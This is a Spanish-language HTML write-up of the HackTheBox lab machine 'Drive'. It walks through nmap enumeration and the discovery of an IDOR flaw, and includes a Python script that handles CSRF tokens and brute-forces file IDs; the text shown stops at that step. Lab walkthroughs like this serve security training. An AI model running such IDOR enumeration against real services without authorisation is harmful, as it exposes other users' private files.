@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Writeup Drive</title>
+ <link rel="stylesheet" href="/assets/css/styles_machine.css" />
+ <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
+ <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
+ <link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">    
+</head>
+<body>
+  <div class="menu">
+    <div id="mySidepanel" class="sidepanel">
+        <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">×</a>
+        <a href="/htb">HackTheBox</a>
+        <a href="/">Home</a>
+        <a href="https://mrpr1ngl3s.github.io/blog">Blog</a>
+    </div>
+    
+    <button class="openbtn" onclick="openNav()">☰</button>  
+</div>
+<script>
+function openNav() {
+if (window.innerWidth <= 1000) {
+    document.getElementById("mySidepanel").style.display = "block";
+} else {
+    document.getElementById("mySidepanel").style.width = "25%";
+}
+}
+
+function closeNav() {
+if (window.innerWidth <= 1000) {
+    document.getElementById("mySidepanel").style.display = "none";
+} else {
+    document.getElementById("mySidepanel").style.width = "0";
+}
+
+}
+
+</script>
+
+  <div class="main">
+<a href="https://app.hackthebox.com/machines/Drive/"  target="_blank"><img style="float: right; margin-left:60px; height:90px;" src="/img/Drive.png"/></a>
+<h1 id="drive">Drive</h1>
+<h2 id="enumeración">Enumeración</h2>
+<p>Iniciamos con la máquina comprobando la conectividad realizando un <strong>ping</strong> a la IP <strong>10.10.11.235</strong>.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>❯ <span class="fu">ping</span> -c 1 10.10.11.235</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a><span class="ex">PING</span> 10.10.11.235 (10.10.11.235) <span class="ex">56</span>(84) <span class="ex">bytes</span> of data.</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">64</span> bytes from 10.10.11.235: icmp_seq=1 ttl=63 time=96.6 ms</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="ex">---</span> 10.10.11.235 ping statistics ---</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">1</span> packets transmitted, 1 received, 0% packet loss, time 0ms</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="ex">rtt</span> min/avg/max/mdev = 96.567/96.567/96.567/0.000 ms</span></code></pre></div>
+<p>En el output del comando ejecutado en el parámetro <strong>ttl</strong> se ve que el valor está más cerca del <strong>64</strong> que del <strong>128</strong>, gracias a este parámetro se puede saber el sistema operativo que se está utilizando, en este caso un Linux.</p>
+<table>
+<thead>
+<tr class="header">
+<th>TTL</th>
+<th>OS</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>64</td>
+<td>GNU/Linux</td>
+</tr>
+<tr class="even">
+<td>128</td>
+<td>Windows</td>
+</tr>
+</tbody>
+</table>
+<p>Vamos a utilizar la herramienta <strong>Nmap</strong> para escanear los puertos que estén abiertos y los servicios que están asociados a estos.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a>❯ <span class="fu">nmap</span> -p- --open -sCV -n --min-rate 5000 -Pn 10.10.11.235 -oN Scan</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 8%" />
+<col style="width: 91%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-p-</td>
+<td>Indica que analice todos los puertos del 1 al 65535</td>
+</tr>
+<tr class="even">
+<td>–open</td>
+<td>Únicamente se escanearan los puertos que estén abiertos</td>
+</tr>
+<tr class="odd">
+<td>-sC</td>
+<td>Lanza scripts que tiene Nmap por defecto para detectar el tipo de servicio que este corriendo en un puerto</td>
+</tr>
+<tr class="even">
+<td>-sV</td>
+<td>Lanza scripts que tiene Nmap para saber que versión están utilizando los servicios</td>
+</tr>
+<tr class="odd">
+<td>-n</td>
+<td>Se evita realizar resolución DNS</td>
+</tr>
+<tr class="even">
+<td>–min-rate</td>
+<td>Indica la cantidad de paquetes que se envían por segundo, en este caso 5000</td>
+</tr>
+<tr class="odd">
+<td>-Pn</td>
+<td>Deshabilita la búsqueda del host, solamente manda los paquetes a los puertos.</td>
+</tr>
+<tr class="even">
+<td>-oN</td>
+<td>Exporta el output del comando ejecutado a un archivo en formato nmap</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a>❯ <span class="fu">nmap</span> -p- --open -sCV -n --min-rate 5000 -Pn 10.10.11.235 -oN Scan</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.93 ( https://nmap.org ) <span class="ex">at</span> 2024-02-29 12:24 CET</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 10.10.11.235</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a><span class="ex">Host</span> is up (0.098s latency)<span class="ex">.</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a><span class="ex">Not</span> shown: 65532 closed tcp ports (reset), <span class="ex">1</span> filtered tcp port (no-response)</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a><span class="ex">Some</span> closed ports may be reported as filtered due to --defeat-rst-ratelimit</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0)</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">ssh-hostkey</span>: </span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">3072</span> 275a9fdb91c316e57da60d6dcb6bbd4a (RSA)</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">256</span> 9d076bc847280df29f81f2b8c3a67853 (ECDSA)</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  256 1d30349f797369bdf667f3343c1ff94e (ED25519)</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a><span class="ex">80/tcp</span> open  http    nginx 1.18.0 (Ubuntu)</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-title</span>: Did not follow redirect to http://drive.htb/</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-server-header</span>: nginx/1.18.0 (Ubuntu)</span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true"></a></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true"></a><span class="ex">Nmap</span> done: 1 IP address (1 host up) <span class="ex">scanned</span> in 26.20 seconds</span></code></pre></div>
+<p>Los puertos que se han descubierto son.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Puertos</th>
+<th>Servicio</th>
+<th>Versión</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 8.2p1</td>
+</tr>
+<tr class="even">
+<td>80</td>
+<td>HTTP</td>
+<td>nginx 1.18.0</td>
+</tr>
+</tbody>
+</table>
+<p>Vemos que tiene el dominio <strong>drive.htb</strong> por lo que si tratamos de acceder no podremos visualizar nada. Esto se debe que necesitamos primero indicar al sistema que este dominio hace referencia a la dirección IP <strong>10.10.11.235</strong>. Para lograr esto, debemos añadir una entrada correspondiente en el archivo <strong>/etc/hosts</strong>.</p>
+<img src="Img/Pasted image 20240229125221 1.png">
+<p>Ahora al acceder al dominio ya nos muestra la pagina.</p>
+<img src="Img/Pasted image 20240229124528 1.png">
+<h2 id="búsqueda-de-vulnerabilidades">Búsqueda de Vulnerabilidades</h2>
+<p>Vemos una sección de registro y login.</p>
+<p>Al crearnos un usuario ahora vemos 2 nuevas secciones <strong>upload file</strong> y <strong>dashboard</strong>.</p>
+<img src="Img/Pasted image 20240229133637 1.png">
+<p>Accediendo a dashboard vemos un archivo.</p>
+<img src="Img/Pasted image 20240229133807 1.png">
+<p>Pinchando en el archivo vemos que ahora en la URL nos muestra su ID, en este caso es el numero 100.</p>
+<img src="Img/Pasted image 20240229135434 1.png">
+<p>Al cambiar el numero ahora nos muestra otro archivo pero en este caso no tenemos acceso a este.</p>
+<img src="Img/Pasted image 20240229135627 1.png">
+<p>Habrán mas archivos a parte de esos 2 por lo que para no estar poniendo manualmente los ID vamos a crear un script el cual lo automatice.</p>
+<p>Si tratamos de ver la petición con <strong>curl</strong> nos salta un panel de login.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a>❯ <span class="ex">curl</span> -s -X GET <span class="st">&quot;http://drive.htb/100/getFileDetail/&quot;</span> -L</span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 9%" />
+<col style="width: 90%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-s</td>
+<td>Indica que en el output no se mostrara el mensaje de progreso que se muestra durante una solicitud.</td>
+</tr>
+<tr class="even">
+<td>-X</td>
+<td>El tipo de método que se utilizara en la solicitud POST, GET etc.</td>
+</tr>
+<tr class="odd">
+<td>-L</td>
+<td>Indica que curl seguirá automáticamente todas las redirecciones HTTP hasta llegar al recurso final.</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true"></a><span class="op">&lt;</span>!<span class="ex">DOCTYPE</span> html<span class="op">&gt;</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true"></a><span class="op">&lt;</span><span class="ex">html</span><span class="op">&gt;</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true"></a><span class="op">&lt;</span><span class="fu">head</span><span class="op">&gt;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true"></a>    <span class="op">&lt;</span><span class="ex">meta</span> charset=<span class="st">&#39;utf-8&#39;</span><span class="op">&gt;</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true"></a>    <span class="op">&lt;</span><span class="ex">meta</span> http-equiv=<span class="st">&#39;X-UA-Compatible&#39;</span> content=<span class="st">&#39;IE=edge&#39;</span><span class="op">&gt;</span>  </span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true"></a><span class="op">&lt;</span><span class="ex">title</span><span class="op">&gt;</span> Sign up<span class="op">&lt;</span>/title<span class="op">&gt;</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true"></a>    <span class="op">&lt;</span><span class="ex">meta</span> name=<span class="st">&#39;viewport&#39;</span> content=<span class="st">&#39;width=device-width, initial-scale=1&#39;</span><span class="op">&gt;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true"></a>    <span class="op">&lt;</span><span class="fu">link</span> rel=<span class="st">&quot;stylesheet&quot;</span> href=<span class="st">&quot;/static/bootstrap/css/bootstrap.css&quot;</span><span class="op">&gt;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true"></a>    <span class="op">&lt;</span><span class="ex">script</span> src=<span class="st">&quot;/static/bootstrap/js/jqurey.js&quot;</span><span class="op">&gt;&lt;</span>/script<span class="op">&gt;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true"></a>    <span class="op">&lt;</span><span class="ex">script</span> src=<span class="st">&quot;/static/bootstrap/js/popper.min.js&quot;</span><span class="op">&gt;&lt;</span>/script<span class="op">&gt;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true"></a>    <span class="op">&lt;</span><span class="ex">script</span> src=<span class="st">&quot;/static/bootstrap/js/bootstrap.js&quot;</span><span class="op">&gt;&lt;</span>/script<span class="op">&gt;</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true"></a><span class="op">&lt;</span>/<span class="ex">head</span><span class="op">&gt;</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true"></a><span class="op">&lt;</span><span class="ex">body</span><span class="op">&gt;</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true"></a> <span class="op">&lt;</span><span class="ex">div</span> class=<span class="st">&quot;&quot;</span> style=<span class="st">&quot;height: 100vh;display: flex; justify-content: center;align-items: center; background-color: aliceblue;&quot;</span> <span class="op">&gt;</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true"></a>     <span class="op">&lt;</span><span class="ex">form</span> method=<span class="st">&quot;POST&quot;</span> class=<span class="st">&quot;form-group&quot;</span><span class="op">&gt;</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true"></a>        <span class="op">&lt;</span><span class="ex">input</span> type=<span class="st">&quot;hidden&quot;</span> name=<span class="st">&quot;csrfmiddlewaretoken&quot;</span> value=<span class="st">&quot;nvKR1dkwuOEJ8n4v2dM2c1VusQgM2csU1SXwWntPk4RZLnLiOVREA8LtI2YFzcot&quot;</span><span class="op">&gt;</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true"></a>        <span class="op">&lt;</span><span class="ex">div</span> class=<span class="st">&quot;form-group&quot;</span><span class="op">&gt;</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true"></a>            <span class="op">&lt;</span><span class="ex">h5</span><span class="op">&gt;</span>Username:<span class="op">&lt;</span>/h5<span class="op">&gt;</span></span>
+<span id="cb5-19"><a href="#cb5-19" aria-hidden="true"></a>            <span class="op">&lt;</span><span class="ex">input</span> type=<span class="st">&quot;text&quot;</span> name=<span class="st">&quot;username&quot;</span> autofocus autocapitalize=<span class="st">&quot;none&quot;</span> autocomplete=<span class="st">&quot;username&quot;</span> maxlength=<span class="st">&quot;150&quot;</span> required id=<span class="st">&quot;id_username&quot;</span><span class="op">&gt;</span></span>
+<span id="cb5-20"><a href="#cb5-20" aria-hidden="true"></a>        <span class="op">&lt;</span>/<span class="ex">div</span><span class="op">&gt;</span></span>
+<span id="cb5-21"><a href="#cb5-21" aria-hidden="true"></a>        <span class="op">&lt;</span><span class="ex">div</span> class=<span class="st">&quot;form-group&quot;</span><span class="op">&gt;</span></span>
+<span id="cb5-22"><a href="#cb5-22" aria-hidden="true"></a>            <span class="op">&lt;</span><span class="ex">h5</span><span class="op">&gt;</span>Password:<span class="op">&lt;</span>/h5<span class="op">&gt;</span></span>
+<span id="cb5-23"><a href="#cb5-23" aria-hidden="true"></a>            <span class="op">&lt;</span><span class="ex">input</span> type=<span class="st">&quot;password&quot;</span> name=<span class="st">&quot;password&quot;</span> autocomplete=<span class="st">&quot;current-password&quot;</span> required id=<span class="st">&quot;id_password&quot;</span><span class="op">&gt;</span></span>
+<span id="cb5-24"><a href="#cb5-24" aria-hidden="true"></a>        <span class="op">&lt;</span>/<span class="ex">div</span><span class="op">&gt;</span></span>
+<span id="cb5-25"><a href="#cb5-25" aria-hidden="true"></a>        <span class="op">&lt;</span><span class="ex">p</span> class=<span class="st">&quot;text-center&quot;</span><span class="op">&gt;</span> <span class="op">&lt;</span>span class=<span class="st">&quot;h5 font-weight-bold&quot;</span><span class="op">&gt;</span> Register <span class="op">&lt;</span>/span<span class="op">&gt;&lt;</span>a href=<span class="st">&quot;/register/&quot;</span> class=<span class="st">&quot;font-weight-bold&quot;</span><span class="op">&gt;</span> here<span class="op">&lt;</span>/a<span class="op">&gt;&lt;</span>/p<span class="op">&gt;</span></span>
+<span id="cb5-26"><a href="#cb5-26" aria-hidden="true"></a>        <span class="op">&lt;</span><span class="ex">button</span> type=<span class="st">&quot;submit&quot;</span> class=<span class="st">&quot;btn btn-primary btn-block&quot;</span><span class="op">&gt;</span>Login<span class="op">&lt;</span>/button<span class="op">&gt;</span></span>
+<span id="cb5-27"><a href="#cb5-27" aria-hidden="true"></a><span class="op">&lt;</span>/<span class="ex">form</span><span class="op">&gt;</span></span>
+<span id="cb5-28"><a href="#cb5-28" aria-hidden="true"></a> <span class="op">&lt;</span>/<span class="ex">div</span><span class="op">&gt;</span></span>
+<span id="cb5-29"><a href="#cb5-29" aria-hidden="true"></a><span class="op">&lt;</span>/<span class="ex">body</span><span class="op">&gt;</span></span>
+<span id="cb5-30"><a href="#cb5-30" aria-hidden="true"></a><span class="op">&lt;</span>/<span class="ex">html</span><span class="op">&gt;</span></span></code></pre></div>
+<p>Al interceptar la petición del login con BurpSuite vemos que arrastra un <strong>csrftoken</strong>.</p>
+<img src="Img/Pasted image 20240229171252 1.png">
+<p>Realizando una petición al login con <strong>curl</strong> vemos que el <strong>csrftoken</strong> va cambiando con cada solicitud.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a>❯ <span class="kw">for</span> <span class="ex">x</span> in <span class="va">$(</span><span class="fu">seq</span> 1 10<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="ex">curl</span> -s -X GET <span class="st">&quot;http://drive.htb/login&quot;</span> -L <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;csrfmiddlewaretoken&quot;</span> <span class="kw">|</span> <span class="fu">grep</span> -oP <span class="st">&#39;value=\K&quot;.*?&quot;&#39;</span><span class="kw">;</span> <span class="kw">done</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="st">&quot;fdd31DJrfbuhlg7RvQfGS9kj7Vb0f4kC3cOtA8K1Be8yPuE54kYkfm7MFeIQBGjh&quot;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="st">&quot;NzTLxmz9mPHM9yQine3PfvJADkuE0WueJBe8daeNsG8jVrqLrk2I5F8lfROjb4PH&quot;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a><span class="st">&quot;oCDDyeSwe2nJIlCnSsmdNv9xEuZwnJG8ribC73xQaXSuazaDjEnp4U7yUCOkt2vv&quot;</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a><span class="st">&quot;zNIPr6LMAGqbydnAkTEaiOI9bvx1GsLFOTWcrja0uA9tRxXoUaQR2W7Mx7QRm3jY&quot;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a><span class="st">&quot;Eg04aKsW1550xGXtIBWc8BUbiHUg87q9tp6qkaAq1c7SDnV025nFmghGEXdj6mj2&quot;</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a><span class="st">&quot;cCCVaWFUSKfAjaHwCvn9guennDAEg3EYDfmugz0fI2jR97deJyLtXcDgfe7KJzTd&quot;</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a><span class="st">&quot;xiaq5gSHgyugEY9gBmd9GFpENZFrkMV6dCLLHyBeWjwrlKbHbMaQAu15MYvYfDrD&quot;</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a><span class="st">&quot;FhadIZsiAWcyBqQdmZoFJWsqkrFfDzUnVaNY0vff2jjjF8xEkoSNFLJgYT1RZeCR&quot;</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a><span class="st">&quot;o94nw77kRs69tCRrejTMdS6syf1ssY1RYNrnykVFYOAkOp89QFvO1CEVGw04slvq&quot;</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a><span class="st">&quot;xfugpCLt03PdJANQCNfeMa6bDPpoILuR0eJCpWJTzPszDCxbpiwWehOVX07O2k1G&quot;</span></span></code></pre></div>
+<p>Por lo que parar arrastrar el mismo <strong>csrftoken</strong> se va a tener que jugar con <strong>session</strong> en el script de Python para guardar la sesión.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true"></a><span class="co">#!/usr/bin/python3  </span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="im">import</span> requests  </span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true"></a><span class="im">import</span> signal  </span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true"></a><span class="im">import</span> sys  </span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true"></a><span class="im">import</span> time  </span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span>  </span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true"></a><span class="im">import</span> pdb  </span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true"></a><span class="im">import</span> re</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true"></a></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true"></a><span class="kw">def</span> ctrl_c(sig, frame):  </span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true"></a>    <span class="bu">print</span>(<span class="st">&quot;</span><span class="ch">\n\n</span><span class="st">[+] Saliendo ...</span><span class="ch">\n</span><span class="st">&quot;</span>)  </span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true"></a>    sys.exit(<span class="dv">1</span>)  </span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true"></a>  </span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true"></a>signal.signal(signal.SIGINT, ctrl_c)  </span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true"></a>  </span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true"></a><span class="co"># Variables globales  </span></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true"></a>login_url <span class="op">=</span> <span class="st">&quot;http://drive.htb/login/&quot;</span>  </span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true"></a>s <span class="op">=</span> requests.session()  </span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true"></a>  </span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true"></a><span class="kw">def</span> GetCsrfToken():  </span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true"></a>    r <span class="op">=</span> s.get(login_url)  </span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true"></a>  </span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true"></a>    <span class="cf">return</span> re.findall(<span class="st">&#39;name=&quot;csrfmiddlewaretoken&quot; value=&quot;(.*?)&quot;&#39;</span>, r.text)[<span class="dv">0</span>]  </span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true"></a></span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true"></a><span class="kw">def</span> login(token, username, password):  </span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true"></a>  </span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true"></a>    post_data <span class="op">=</span> {  </span>
+<span id="cb7-28"><a href="#cb7-28" aria-hidden="true"></a>        <span class="st">&#39;csrfmiddlewaretoken&#39;</span>: token,  </span>
+<span id="cb7-29"><a href="#cb7-29" aria-hidden="true"></a>        <span class="st">&#39;username&#39;</span>: username,  </span>
+<span id="cb7-30"><a href="#cb7-30" aria-hidden="true"></a>        <span class="st">&#39;password&#39;</span>: password  </span>
+<span id="cb7-31"><a href="#cb7-31" aria-hidden="true"></a>    }  </span>
+<span id="cb7-32"><a href="#cb7-32" aria-hidden="true"></a>  </span>
+<span id="cb7-33"><a href="#cb7-33" aria-hidden="true"></a>    r <span class="op">=</span> s.post(login_url, data<span class="op">=</span>post_data)  </span>
+<span id="cb7-34"><a href="#cb7-34" aria-hidden="true"></a>  </span>
+<span id="cb7-35"><a href="#cb7-35" aria-hidden="true"></a><span class="kw">def</span> BruteForceIDs():  </span>
+<span id="cb7-36"><a href="#cb7-36" aria-hidden="true"></a>  </span>
+<span id="cb7-37"><a href="#cb7-37" aria-hidden="true"></a>        <span class="cf">for</span> <span class="bu">id</span> <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>,<span class="dv">200</span>):  </span>
+<span id="cb7-38"><a href="#cb7-38" aria-hidden="true"></a>        r <span class="op">=</span> s.get(<span class="ss">f&#39;http://drive.htb/</span><span class="sc">{</span><span class="bu">id</span><span class="sc">}</span><span class="ss">/getFileDetail/&#39;</span>)  </span>
+<span id="cb7-39"><a href="#cb7-39" aria-hidden="true"></a>    </span>
+<span id="cb7-40"><a href="#cb7-40" aria-hidden="true"></a>        <span class="cf">if</span> r.status_code <span class="op">!=</span> <span class="dv">500</span>:  </span>
+<span id="cb7-41"><a href="#cb7-41" aria-hidden="true"></a>            <span class="bu">print</span>(<span class="ss">f&quot;[+] Code: </span><span class="sc">{r.</span>status_code<span class="sc">}</span><span class="ss"> ID: </span><span class="sc">{</span><span class="bu">id</span><span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb7-42"><a href="#cb7-42" aria-hidden="true"></a>            </span>
+<span id="cb7-43"><a href="#cb7-43" aria-hidden="true"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&quot;__main__&quot;</span>:  </span>
+<span id="cb7-44"><a href="#cb7-44" aria-hidden="true"></a>    csrfmiddlewaretoken <span class="op">=</span> GetCsrfToken()  </span>
+<span id="cb7-45"><a href="#cb7-45" aria-hidden="true"></a>    login(csrfmiddlewaretoken, <span class="st">&#39;pr1ngl3ss&#39;</span>, <span class="st">&#39;pringles!@&#39;</span>)  </span>
+<span id="cb7-46"><a href="#cb7-46" aria-hidden="true"></a>    BruteForceIDs()</span></code></pre></div>
+<p>Lo primero que hace el script es obtener la sesión y el <strong>csrftoken</strong> mediante expresiones regulares.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a>r <span class="op">=</span> s.get(login_url)</span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true"></a></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true"></a><span class="cf">return</span> re.findall(<span class="st">&#39;name=&quot;csrfmiddlewaretoken&quot; value=&quot;(.*?)&quot;&#39;</span>, r.text)[<span class="dv">0</span>]</span></code></pre></div>
+<p>Obtenido el <strong>csrftoken</strong> envía junto a este las credenciales al panel de login.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a>post_data <span class="op">=</span> {  </span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true"></a>        <span class="st">&#39;csrfmiddlewaretoken&#39;</span>: token,  </span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true"></a>        <span class="st">&#39;username&#39;</span>: username,  </span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true"></a>        <span class="st">&#39;password&#39;</span>: password  </span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true"></a>}  </span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true"></a></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true"></a>r <span class="op">=</span> s.post(login_url, data<span class="op">=</span>post_data)</span></code></pre></div>
+<p>Para finalmente realizar un <strong>IDOR</strong> automatizado el cual descubrirá los archivo existentes mediante el código de estado.</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="cf">for</span> <span class="bu">id</span> <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>,<span class="dv">200</span>):  </span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a>        r <span class="op">=</span> s.get(<span class="ss">f&#39;http://drive.htb/</span><span class="sc">{</span><span class="bu">id</span><span class="sc">}</span><span class="ss">/getFileDetail/&#39;</span>)</span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true"></a>    </span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true"></a>        <span class="cf">if</span> r.status_code <span class="op">!=</span> <span class="dv">500</span>:  </span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true"></a>            <span class="bu">print</span>(<span class="ss">f&quot;[+] Code: </span><span class="sc">{r.</span>status_code<span class="sc">}</span><span class="ss"> ID: </span><span class="sc">{</span><span class="bu">id</span><span class="sc">}</span><span class="ss">&quot;</span>)</span></code></pre></div>
